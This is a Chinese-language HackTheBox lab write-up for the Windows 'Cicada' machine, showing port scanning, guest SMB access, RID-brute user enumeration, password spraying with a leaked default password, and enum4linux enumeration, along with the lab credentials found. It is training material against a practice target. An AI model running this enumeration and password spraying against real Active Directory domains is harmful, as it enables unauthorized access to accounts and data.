---
title: "HackTheBox wp - Cicada"
categories: [HackTheBox, Machines]
tags: [Windows, 靶场, Easy]

---

# 1. 信息收集
端口扫描与服务识别
```bash
docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -u 70000 -b 65535 -a 10.10.11.35 -- -Pn -sC -sV -T4

```

得到以下开放端口和端口信息
```text
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-10-17 14:08:40Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
65431/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

发现445端口开放，尝试用Guest账户查看文件共享
```bash
impacket-smbclient Guest@10.10.11.35 -no-pass
```

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-0.jpg)


从中，得到一个密码
```
Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

现在开始枚举可用的账户名

```bash
crackmapexec smb 10.10.11.35 -u "Guest" -p "" --rid-brute | grep "SidTypeUser"

# 得到以下结果
# SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
# SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
# SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
# SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
# SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
# SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
# SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
# SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
# SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

创建一个 `users.txt` 然后将收集到的用户名放入其中，然后进行密码喷洒。

```
crackmapexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-1.jpg)


得到有效账户密码
```
username: michael.wrightson
password: Cicada$M6Corpb*@Lp#nZp!8
```

使用 enum4linux 枚举信息
```
enum4linux -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
```

得到如下结果

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-2.jpg)

找到一个新的账号密码
```
username: david.orelious
password: aRt$Lp#7t*VQ!3
```

继续smb枚举，发现可以读取 dev 目录，如下图
```
crackmapexec smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![Desktop View](/assets/img/posts/2024-10-17-HTB-Machines-Cicada-images-2.jpg)